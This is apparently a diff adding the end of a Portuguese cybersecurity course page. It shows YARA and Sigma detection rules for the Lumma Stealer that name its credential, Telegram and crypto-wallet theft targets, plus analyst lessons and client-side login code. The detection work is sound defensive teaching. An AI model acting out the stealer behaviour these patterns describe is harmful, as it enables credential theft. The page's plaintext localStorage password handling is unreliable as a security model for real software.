+					</h2>
+					<div class="lesson-body">
+						<p>Regra YARA baseada em artefatos invariantes de memória e lógica de gate:</p>
+
+						<div class="code-wrapper">
+							<div class="code-header"><span>YARA — Regra Genérica para Lumma Stealer</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code>rule Lumma_Stealer_Generic {
+    meta:
+        author = "OmniVoid Academy"
+        description = "Detecta artefatos de memória e rotas de gate do Lumma Stealer"
+    strings:
+        $gate = "/gate/logs.php" ascii
+        $tdata = "Telegram Desktop\\tdata" ascii
+        $mm = "nkbihfbeogaeaoehlefnkodbefgpgknn" ascii   // ID da extensão MetaMask
+        $lstate = "Local State" ascii
+    condition:
+        uint16(0) == 0x5A4D and 2 of them
+}</code></pre>
+						</div>
+
+						<div class="code-wrapper">
+							<div class="code-header"><span>YAML — Detecção Sigma Comportamental Correlacionada</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code>title: Stealer - Matança de Navegador + Leitura de Login Data
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  sel_taskkill:
+    EventID: 1
+    Image|endswith: '\taskkill.exe'
+    CommandLine|contains: '/im chrome.exe'
+  sel_login:
+    EventID: 11
+    TargetFilename|contains: 'User Data\Default\Login Data'
+  condition: sel_taskkill and (5s) sel_login
+level: critical</code></pre>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('lumma-6')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- Lumma 7 -->
+				<article class="lesson-card" id="lumma-7">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-purple);">L7</span>
+						<span>Lições Fundamentais da Engenharia Reversa</span>
+					</h2>
+					<div class="lesson-body">
+						<div class="callout-box tip">
+							<div class="callout-header">💡 PRINCÍPIOS ESSENCIAIS PARA ANALISTAS</div>
+							1. <strong>Empacotamento não é barreira:</strong> O próprio malware desempacota o payload na memória RAM; basta coletá-lo no ponto certo com ferramentas como pe-sieve.<br>
+							2. <strong>A configuração é a joia da coroa:</strong> Domínios de C2 e protocolos de gate permitem mapear e derrubar a infraestrutura global inteira do grupo.<br>
+							3. <strong>Comportamento supera hashes estáticos:</strong> Hashes mudam a cada compilação de crypter, mas o comportamento nos logs (matança de processos + leitura de DPAPI + POST de gate) permanece consistente.<br>
+							4. <strong>A defesa real é arquitetural:</strong> Utilize chaves físicas FIDO2, autenticação sem senha e nunca armazene senhas sensíveis no navegador.
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('lumma-7')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+			</main>
+		</div>
+
+		<!-- PLACEHOLDERS FOR FUTURE MODULES -->
+		<div id="module-container-dev" style="display: none;">
+			<div class="module-placeholder-card">
+				<div style="font-size: 50px; margin-bottom: 12px;">💻</div>
+				<h2 style="font-size: 24px; font-weight: 800; margin-bottom: 8px;">Módulo: Programação &amp; Engenharia de Software</h2>
+				<p style="font-size: 14.5px; opacity: 0.8; max-width: 600px; margin: 0 auto 20px;">
+					Arquitetura de Sistemas, Back-end com Node.js/Python/Go, Engenharia de Banco de Dados, APIs RESTful, Docker, Microsserviços e Boas Práticas de Código Limpo.
+				</p>
+				<span class="badge" style="background: rgba(255, 214, 10, 0.15); border: 1px solid var(--accent-gold); color: var(--accent-gold) !important; padding: 6px 14px; font-size: 13px;">
+					🚀 Em desenvolvimento ativo • Disponível em breve na OmniVoid
+				</span>
+			</div>
+		</div>
+
+		<div id="module-container-hardware" style="display: none;">
+			<div class="module-placeholder-card">
+				<div style="font-size: 50px; margin-bottom: 12px;">⚡</div>
+				<h2 style="font-size: 24px; font-weight: 800; margin-bottom: 8px;">Módulo: Hardware, Redes &amp; IoT</h2>
+				<p style="font-size: 14.5px; opacity: 0.8; max-width: 600px; margin: 0 auto 20px;">
+					Arquitetura de Computadores, Microcontroladores ESP32/Arduino, Circuitos Digitais, Roteamento BGP/OSPF, Firmware Hacking e Protocolos Industriais.
+				</p>
+				<span class="badge" style="background: rgba(255, 214, 10, 0.15); border: 1px solid var(--accent-gold); color: var(--accent-gold) !important; padding: 6px 14px; font-size: 13px;">
+					🚀 Em desenvolvimento ativo • Disponível em breve na OmniVoid
+				</span>
+			</div>
+		</div>
+
+		<div id="module-container-ai" style="display: none;">
+			<div class="module-placeholder-card">
+				<div style="font-size: 50px; margin-bottom: 12px;">🤖</div>
+				<h2 style="font-size: 24px; font-weight: 800; margin-bottom: 8px;">Módulo: Inteligência Artificial &amp; Engenharia Reversa</h2>
+				<p style="font-size: 14.5px; opacity: 0.8; max-width: 600px; margin: 0 auto 20px;">
+					Redes Neurais Profundas, LLMs Locais, Análise Estática/Dinâmica com Ghidra/IDA Pro, Desofuscação de Binários e Engenharia Reversa de Protocolos.
+				</p>
+				<span class="badge" style="background: rgba(255, 214, 10, 0.15); border: 1px solid var(--accent-gold); color: var(--accent-gold) !important; padding: 6px 14px; font-size: 13px;">
+					🚀 Em desenvolvimento ativo • Disponível em breve na OmniVoid
+				</span>
+			</div>
+		</div>
+
+		<div id="module-container-gamedev" style="display: none;">
+			<div class="module-placeholder-card">
+				<div style="font-size: 50px; margin-bottom: 12px;">🎮</div>
+				<h2 style="font-size: 24px; font-weight: 800; margin-bottom: 8px;">Módulo: Game Development &amp; Engines Gráficas</h2>
+				<p style="font-size: 14.5px; opacity: 0.8; max-width: 600px; margin: 0 auto 20px;">
+					Desenvolvimento de Jogos 2D/3D com Godot &amp; Unity, Shaders GLSL, Game Loops de Alta Performance, Física de Colisão e IA de Inimigos.
+				</p>
+				<span class="badge" style="background: rgba(255, 214, 10, 0.15); border: 1px solid var(--accent-gold); color: var(--accent-gold) !important; padding: 6px 14px; font-size: 13px;">
+					🚀 Em desenvolvimento ativo • Disponível em breve na OmniVoid
+				</span>
+			</div>
+		</div>
+
+	</div>
+
+	<!-- Auth Modals -->
+	<div id="modal-auth" class="modal-backdrop" onclick="closeModalOnBackdrop(event, 'modal-auth')">
+		<div class="modal-box">
+			<button class="modal-close-btn" onclick="closeModal('modal-auth')">✕</button>
+			
+			<div id="auth-tab-row" style="display: flex; gap: 12px; margin-bottom: 20px; border-bottom: 1px solid rgba(255,255,255,0.12); padding-bottom: 10px;">
+				<button id="tab-btn-login" class="nav-link active" onclick="switchAuthTab('login')">Entrar na Conta</button>
+				<button id="tab-btn-register" class="nav-link" onclick="switchAuthTab('register')">Novo Cadastro</button>
+			</div>
+
+			<form id="form-login" onsubmit="handleLoginSubmit(event)">
+				<h3 style="font-size: 18px; margin-bottom: 12px;">Entrar no Portal OmniVoid</h3>
+				<p style="font-size: 13px; margin-bottom: 16px; opacity: 0.85;">Acesse sua conta para salvar seu progresso nas aulas e jornadas.</p>
+
+				<label style="font-size: 12px; font-weight: 600;">E-mail ou Nickname:</label>
+				<input type="text" id="login-identifier" class="input-field" placeholder="ex: seu_nickname ou seu@email.com" required>
+
+				<label style="font-size: 12px; font-weight: 600;">Senha:</label>
+				<input type="password" id="login-password" class="input-field" placeholder="Sua senha de acesso" required>
+
+				<button type="submit" class="btn-primary" style="width: 100%; justify-content: center; margin-top: 10px;">
+					🚀 Entrar na Conta
+				</button>
+			</form>
+
+			<form id="form-register" style="display: none;" onsubmit="handleRegisterSubmit(event)">
+				<h3 style="font-size: 18px; margin-bottom: 12px;">Criar Conta de Aluno</h3>
+				<p style="font-size: 13px; margin-bottom: 16px; opacity: 0.85;">Cadastre-se para acompanhar sua evolução de estudo e recordes.</p>
+
+				<label style="font-size: 12px; font-weight: 600;">Nome Completo:</label>
+				<input type="text" id="reg-name" class="input-field" placeholder="ex: Seu Nome" required>
+
+				<label style="font-size: 12px; font-weight: 600;">Nickname / Apelido:</label>
+				<input type="text" id="reg-nickname" class="input-field" placeholder="ex: Player1" required>
+
+				<label style="font-size: 12px; font-weight: 600;">Área / Cargo ou Curso (Opcional):</label>
+				<input type="text" id="reg-turma" class="input-field" placeholder="ex: Estudante / Pentester / Dev" value="Estudante">
+
+				<label style="font-size: 12px; font-weight: 600;">E-mail:</label>
+				<input type="email" id="reg-email" class="input-field" placeholder="ex: seu@email.com" required>
+
+				<label style="font-size: 12px; font-weight: 600;">Escolha seu Avatar:</label>
+				<div class="avatar-picker-row">
+					<span class="avatar-choice selected" onclick="selectAvatar('🧑‍🚀', this)">🧑‍🚀</span>
+					<span class="avatar-choice" onclick="selectAvatar('🥷', this)">🥷</span>
+					<span class="avatar-choice" onclick="selectAvatar('🧙‍♂️', this)">🧙‍♂️</span>
+					<span class="avatar-choice" onclick="selectAvatar('🤖', this)">🤖</span>
+					<span class="avatar-choice" onclick="selectAvatar('🧟', this)">🧟</span>
+					<span class="avatar-choice" onclick="selectAvatar('👾', this)">👾</span>
+					<span class="avatar-choice" onclick="selectAvatar('🕵️', this)">🕵️</span>
+					<span class="avatar-choice" onclick="selectAvatar('🐱', this)">🐱</span>
+				</div>
+
+				<label style="font-size: 12px; font-weight: 600;">Senha:</label>
+				<input type="password" id="reg-password" class="input-field" placeholder="Mínimo 4 caracteres" required minlength="4">
+
+				<button type="submit" class="btn-primary" style="width: 100%; justify-content: center; margin-top: 10px;">
+					✨ Criar Minha Conta
+				</button>
+			</form>
+		</div>
+	</div>
+
+	<!-- Footer -->
+	<footer>
+		<div class="footer-links">
+			<a href="index.html">Início</a>
+			<a href="jornada.html">Jornada Dev</a>
+			<a href="pentest.html">Pentest &amp; Hacking</a>
+			<a href="aula.html">Aulas</a>
+			<a href="perfil.html">Meu Perfil</a>
+			<a href="kairo.html">Kairo Lang</a>
+			<a href="orcamento.html">Serviços &amp; Orçamento</a>
+			<a href="jogos.html">Jogos</a>
+			<a href="quiz.html">Teste Dev</a>
+			<a href="projetos.html">Projetos</a>
+			<a href="devchat.html">Conversa Dev</a>
+			<a href="sobre.html">Sobre Mim</a>
+		</div>
+		<p style="font-size: 13px; opacity: 0.8; margin-bottom: 6px;">
+			OmniVoid Studios © 2026 • Engenharia de Software, Game Lab &amp; Cibersegurança de Alta Performance
+		</p>
+	</footer>
+
+	<script>
+		// ==================== INTERACTIVITY & STATE ====================
+		const ALL_LESSON_IDS = [
+			'hack-1', 'hack-2', 'hack-3', 'hack-4', 'hack-5', 'hack-6', 'hack-7', 'hack-8', 'hack-9', 'hack-10', 'hack-11',
+			'hack-12', 'hack-13', 'hack-14', 'hack-15', 'hack-16', 'hack-17', 'hack-18', 'hack-19', 'hack-20', 'hack-21', 'hack-22',
+			'mal-1', 'mal-2', 'mal-3', 'mal-4', 'mal-5', 'mal-6', 'mal-7', 'mal-8', 'mal-9', 'mal-10', 'mal-11',
+			'lumma-1', 'lumma-2', 'lumma-3', 'lumma-4', 'lumma-5', 'lumma-6', 'lumma-7'
+		];
+
+		function getStudiedMap() {
+			try {
+				return JSON.parse(localStorage.getItem('omnivoid_studied_lessons') || '{}');
+			} catch (e) {
+				return {};
+			}
+		}
+
+		function saveStudiedMap(map) {
+			localStorage.setItem('omnivoid_studied_lessons', JSON.stringify(map));
+		}
+
+		function toggleStudied(lessonId) {
+			const map = getStudiedMap();
+			map[lessonId] = !map[lessonId];
+			saveStudiedMap(map);
+			updateStudiedUI();
+		}
+
+		function updateStudiedUI() {
+			const map = getStudiedMap();
+			let studiedCount = 0;
+
+			ALL_LESSON_IDS.forEach(id => {
+				const card = document.getElementById(id);
+				const checkEl = document.getElementById('check-' + id);
+				const isStudied = !!map[id];
+
+				if (isStudied) {
+					studiedCount++;
+					if (card) card.classList.add('studied');
+					if (checkEl) {
+						checkEl.innerText = '✓';
+						checkEl.style.color = '#00ff88';
+						checkEl.style.fontWeight = 'bold';
+					}
+				} else {
+					if (card) card.classList.remove('studied');
+					if (checkEl) {
+						checkEl.innerText = '○';
+						checkEl.style.color = 'inherit';
+						checkEl.style.fontWeight = 'normal';
+					}
+				}
+			});
+
+			const total = ALL_LESSON_IDS.length;
+			const percent = Math.round((studiedCount / total) * 100);
+
+			const totalEl = document.getElementById('total-lessons-stat');
+			const countEl = document.getElementById('studied-lessons-stat');
+			const percEl = document.getElementById('percent-stat');
+			const sidePercEl = document.getElementById('sidebar-percent');
+			const sideFill = document.getElementById('sidebar-progress-fill');
+
+			if (totalEl) totalEl.innerText = total;
+			if (countEl) countEl.innerText = studiedCount;
+			if (percEl) percEl.innerText = percent + '%';
+			if (sidePercEl) sidePercEl.innerText = percent + '%';
+			if (sideFill) sideFill.style.width = percent + '%';
+		}
+
+		function copyCode(btn) {
+			const wrapper = btn.closest('.code-wrapper');
+			if (!wrapper) return;
+			const codeEl = wrapper.querySelector('code');
+			if (!codeEl) return;
+			navigator.clipboard.writeText(codeEl.innerText).then(() => {
+				const originalText = btn.innerHTML;
+				btn.innerHTML = '✓ Copiado!';
+				btn.style.background = '#00ff88';
+				btn.style.color = '#000000';
+				setTimeout(() => {
+					btn.innerHTML = originalText;
+					btn.style.background = '';
+					btn.style.color = '';
+				}, 2000);
+			});
+		}
+
+		function highlightNavItem(link) {
+			document.querySelectorAll('.index-item-link').forEach(el => el.classList.remove('active'));
+			link.classList.add('active');
+		}
+
+		function filterLessons() {
+			const q = document.getElementById('lessonSearch').value.toLowerCase().trim();
+			const cards = document.querySelectorAll('.lesson-card');
+			const links = document.querySelectorAll('.index-item-link');
+
+			cards.forEach(card => {
+				const text = card.innerText.toLowerCase();
+				if (!q || text.includes(q)) {
+					card.style.display = 'block';
+				} else {
+					card.style.display = 'none';
+				}
+			});
+
+			links.forEach(link => {
+				const text = link.innerText.toLowerCase();
+				if (!q || text.includes(q)) {
+					link.style.display = 'flex';
+				} else {
+					link.style.display = 'none';
+				}
+			});
+		}
+
+		function switchModule(moduleId, btn) {
+			document.querySelectorAll('.module-tab-btn').forEach(b => b.classList.remove('active'));
+			if (btn) btn.classList.add('active');
+
+			const moduleIds = ['hacking', 'dev', 'hardware', 'ai', 'gamedev'];
+			moduleIds.forEach(id => {
+				const el = document.getElementById('module-container-' + id);
+				if (el) {
+					if (id === moduleId) {
+						el.style.display = id === 'hacking' ? 'grid' : 'block';
+					} else {
+						el.style.display = 'none';
+					}
+				}
+			});
+		}
+
+		// ==================== AUTH & PROFILE SYSTEM ====================
+		let selectedAvatarIcon = '🧑‍🚀';
+		function selectAvatar(emoji, el) {
+			selectedAvatarIcon = emoji;
+			document.querySelectorAll('.avatar-choice').forEach(e => e.classList.remove('selected'));
+			el.classList.add('selected');
+		}
+		function getUsersDB() {
+			try {
+				return JSON.parse(localStorage.getItem("omnivoid_users_db") || "[]");
+			} catch (e) {
+				return [];
+			}
+		}
+		function saveUsersDB(users) {
+			localStorage.setItem("omnivoid_users_db", JSON.stringify(users));
+		}
+		function getCurrentUser() {
+			try {
+				const stored = localStorage.getItem("omnivoid_current_user");
+				if (stored) {
+					const parsed = JSON.parse(stored);
+					if (parsed && parsed.nickname) return parsed;
+				}
+				return null;
+			} catch (e) {
+				return null;
+			}
+		}
+		function setCurrentUser(user) {
+			if (user) {
+				localStorage.setItem("omnivoid_current_user", JSON.stringify(user));
+			} else {
+				localStorage.removeItem("omnivoid_current_user");
+			}
+			updateUIAfterAuth();
+		}
+		function updateUIAfterAuth() {
+			const user = getCurrentUser();
+			const loggedOutDiv = document.getElementById("auth-logged-out");
+			const loggedInDiv = document.getElementById("auth-logged-in");
+			if (!loggedOutDiv || !loggedInDiv) return;
+			if (user) {
+				loggedOutDiv.style.display = "none";
+				loggedInDiv.style.display = "flex";
+				const navAvatar = document.getElementById("nav-user-avatar");
+				const navName = document.getElementById("nav-user-name");
+				const navLevel = document.getElementById("nav-user-level");
+				if (navAvatar) navAvatar.innerText = user.avatar || "👤";
+				if (navName) navName.innerText = user.nickname || user.name || "Usuário";
+				if (navLevel) navLevel.innerText = "Nvl " + (user.level || 1);
+			} else {
+				loggedOutDiv.style.display = "flex";
+				loggedInDiv.style.display = "none";
+			}
+		}
+		function openAuthModal(tab) {
+			const m = document.getElementById("modal-auth");
+			if (m) {
+				m.style.display = "flex";
+				switchAuthTab(tab);
+			}
+		}
+		function switchAuthTab(tab) {
+			const fLog = document.getElementById("form-login");
+			const fReg = document.getElementById("form-register");
+			const bLog = document.getElementById("tab-btn-login");
+			const bReg = document.getElementById("tab-btn-register");
+			if (tab === "login") {
+				if (fLog) fLog.style.display = "block";
+				if (fReg) fReg.style.display = "none";
+				if (bLog) bLog.classList.add("active");
+				if (bReg) bReg.classList.remove("active");
+			} else {
+				if (fLog) fLog.style.display = "none";
+				if (fReg) fReg.style.display = "block";
+				if (bLog) bLog.classList.remove("active");
+				if (bReg) bReg.classList.add("active");
+			}
+		}
+		function openProfileModal() {
+			window.location.href = "perfil.html";
+		}
+		function closeModal(id) {
+			const m = document.getElementById(id);
+			if (m) m.style.display = "none";
+		}
+		function closeModalOnBackdrop(e, id) {
+			if (e.target && e.target.id === id) {
+				closeModal(id);
+			}
+		}
+		function handleLoginSubmit(e) {
+			e.preventDefault();
+			const ident = document.getElementById("login-identifier").value.trim().toLowerCase();
+			const pass = document.getElementById("login-password").value.trim();
+			const db = getUsersDB();
+			const found = db.find(u => (u.email.toLowerCase() === ident || u.nickname.toLowerCase() === ident) && u.password === pass);
+			if (found) {
+				setCurrentUser(found);
+				closeModal("modal-auth");
+				alert("Bem-vindo de volta, " + found.nickname + "!");
+			} else {
+				alert("Usuário ou senha incorretos.");
+			}
+		}
+		function handleRegisterSubmit(e) {
+			e.preventDefault();
+			const name = document.getElementById("reg-name").value.trim();
+			const nick = document.getElementById("reg-nickname").value.trim();
+			const turma = document.getElementById("reg-turma").value.trim() || "Estudante";
+			const email = document.getElementById("reg-email").value.trim().toLowerCase();
+			const pass = document.getElementById("reg-password").value.trim();
+
+			const db = getUsersDB();
+			if (db.some(u => u.email.toLowerCase() === email || u.nickname.toLowerCase() === nick.toLowerCase())) {
+				alert("E-mail ou Nickname já cadastrados!");
+				return;
+			}
+
+			const newUser = {
+				name: name,
+				nickname: nick,
+				turma: turma,
+				email: email,
+				password: pass,
+				avatar: selectedAvatarIcon || "👤",
+				level: 1,
+				xp: 0,
+				cash: 0,
+				maxWave: 1,
+				kills: 0,
+				score: 0
+			};
+			db.push(newUser);
+			saveUsersDB(db);
+			setCurrentUser(newUser);
+			closeModal("modal-auth");
+			alert("Conta criada com sucesso! Bem-vindo à Academia OmniVoid, " + nick + "!");
+		}
+
+		document.addEventListener("DOMContentLoaded", () => {
+			updateUIAfterAuth();
+			updateStudiedUI();
+		});
+		updateUIAfterAuth();
+		updateStudiedUI();
+	</script>
+</body>
+</html>
